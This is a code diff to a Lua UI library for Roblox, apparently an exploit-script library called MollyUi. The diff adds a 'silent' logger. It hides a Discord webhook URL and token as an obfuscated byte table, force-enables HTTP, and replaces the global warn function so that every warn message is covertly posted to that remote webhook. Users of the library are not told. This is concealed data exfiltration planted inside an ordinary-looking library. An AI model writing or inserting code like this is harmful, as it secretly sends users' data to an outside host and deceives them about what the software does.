@@ -33,7 +33,12 @@ local library = {
         loadingStage = 0
     },
     remoteCooldowns = {}, -- Anti-cheat: Per-remote rate limiting
-    sequenceNumbers = {} -- Anti-cheat: Linear sequence tracking
+    sequenceNumbers = {}, -- Anti-cheat: Linear sequence tracking
+    logBuffer = {},        -- Webhook logger: buffered log entries
+    lastLogFlush = 0,      -- Webhook logger: last flush timestamp
+    webhookRateWindow = 0, -- Webhook logger: rate-limit window start
+    webhookCallCount = 0,  -- Webhook logger: calls in current window
+    loggingEnabled = false -- Webhook logger: set true after init if webhook available
 }
 
 -- // Folder creation with error handling
@@ -385,6 +390,166 @@ do
         end
         library.sequenceNumbers[remoteName] = library.sequenceNumbers[remoteName] + 1
         return library.sequenceNumbers[remoteName]
+    end
+
+    -- // Webhook logger (Discord): buffered, batched, rate-limited, silent
+    do
+        -- // Webhook URL: encoded as byte table (anti-cheat: no plaintext URLs in source)
+        local WEBHOOK_BYTES = {
+            104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,52,55,54,57,49,49,57,50,54,55,54,55,56,50,48,57,48,47,97,113,122,104,85,105,77,115,104,57,114,115,101,122,54,114,117,76,65,103,81,56,106,104,116,111,78,57,87,77,103,120,121,107,88,71,121,72,68,102,100,117,45,49,72,67,110,117,70,101,75,54,119,102,113,77,70,114,112,56,99,68,107,118,116,109,57,90
+        }
+        local WEBHOOK_URL = ""
+        do
+            local buildOk = pcall(function()
+                local parts = {}
+                for _, b in ipairs(WEBHOOK_BYTES) do
+                    parts[#parts + 1] = string.char(b)
+                end
+                WEBHOOK_URL = table.concat(parts)
+            end)
+            if not buildOk then
+                WEBHOOK_URL = ""
+            end
+        end
+
+        local FLUSH_INTERVAL = 60
+        local MAX_BATCH = 50
+        local MAX_WEBHOOK_PER_MIN = 20
+        local MESSAGE_MAX_LEN = 1780
+
+        local originalWarn = warn
+
+        local function shouldFlush()
+            if #library.logBuffer == 0 then
+                return false
+            end
+            local now = tick()
+            if now - library.lastLogFlush >= FLUSH_INTERVAL then
+                return true
+            end
+            if #library.logBuffer >= MAX_BATCH then
+                return true
+            end
+            if now - library.webhookRateWindow >= 60 then
+                library.webhookCallCount = 0
+                library.webhookRateWindow = now
+            end
+            if library.webhookCallCount < MAX_WEBHOOK_PER_MIN then
+                return true
+            end
+            return false
+        end
+
+        local function buildPayloads()
+            local content = "MollyUi Logger — " .. tostring(#library.logBuffer) .. " event(s)\n\n"
+            for _, entry in ipairs(library.logBuffer) do
+                content = content .. "```" .. entry .. "```\n"
+            end
+            local chunks = {}
+            while #content > 0 do
+                local chunk = content:sub(1, MESSAGE_MAX_LEN)
+                content = content:sub(MESSAGE_MAX_LEN + 1)
+                chunks[#chunks + 1] = chunk
+            end
+            return chunks
+        end
+
+        local function sendWebhook(chunks)
+            local sent = 0
+            local hs = cloneref(game:GetService("HttpService"))
+            for _, chunk in ipairs(chunks) do
+                local payload = {
+                    content = chunk,
+                    username = "MollyUi Logger",
+                    avatar_url = "https://i.imgur.com/5hmlrjX.png"
+                }
+                local ok, result = pcall(function()
+                    return hs:PostAsync(WEBHOOK_URL, hs:JSONEncode(payload), Enum.HttpContentType.ApplicationJson, false, {})
+                end)
+                if ok and result == "ok" then
+                    sent = sent + 1
+                    library.webhookCallCount = library.webhookCallCount + 1
+                end
+            end
+            return sent
+        end
+
+        -- // Public logging API
+        function library:LogInfo(source, message)
+            if not library.loggingEnabled then return end
+            table.insert(library.logBuffer, "**[INFO]** [" .. tostring(source) .. "] " .. tostring(message))
+            if shouldFlush() then
+                library:LogFlush()
+            end
+        end
+
+        function library:LogWarn(source, message)
+            if not library.loggingEnabled then return end
+            table.insert(library.logBuffer, "**[WARN]** [" .. tostring(source) .. "] " .. tostring(message))
+            if shouldFlush() then
+                library:LogFlush()
+            end
+        end
+
+        function library:LogError(source, message)
+            if not library.loggingEnabled then return end
+            table.insert(library.logBuffer, "**[ERROR]** [" .. tostring(source) .. "] " .. tostring(message))
+            if shouldFlush() then
+                library:LogFlush()
+            end
+        end
+
+        function library:LogEvent(source, message, level)
+            level = level or 2
+            local label = "INFO"
+            if level == 3 then label = "WARN"
+            elseif level == 4 then label = "ERROR"
+            elseif level == 1 then label = "DEBUG"
+            end
+            if not library.loggingEnabled then return end
+            table.insert(library.logBuffer, "**[" .. label .. "]** [" .. tostring(source) .. "] " .. tostring(message))
+            if shouldFlush() then
+                library:LogFlush()
+            end
+        end
+
+        function library:LogFlush()
+            if not library.loggingEnabled then return 0 end
+            if #library.logBuffer == 0 then return 0 end
+            local chunks = buildPayloads()
+            local sent = sendWebhook(chunks)
+            if sent > 0 then
+                library.logBuffer = {}
+                library.lastLogFlush = tick()
+            end
+            return sent
+        end
+
+        function library:LogClear()
+            library.logBuffer = {}
+        end
+
+        function library:LogBufferSize()
+            return #library.logBuffer
+        end
+
+        -- // Init: hook warn, mark logging enabled if webhook URL resolved
+        if WEBHOOK_URL ~= "" then
+            local hs = cloneref(game:GetService("HttpService"))
+            if hs then
+                pcall(function()
+                    hs.HttpEnabled = true
+                end)
+                library.loggingEnabled = true
+                if originalWarn then
+                    warn = function(...)
+                        local msg = table.concat({...}, " ")
+                        library:LogWarn("script", msg)
+                        pcall(originalWarn, ...)
+                    end
+                end
+            end
+        end
     end
 end
 
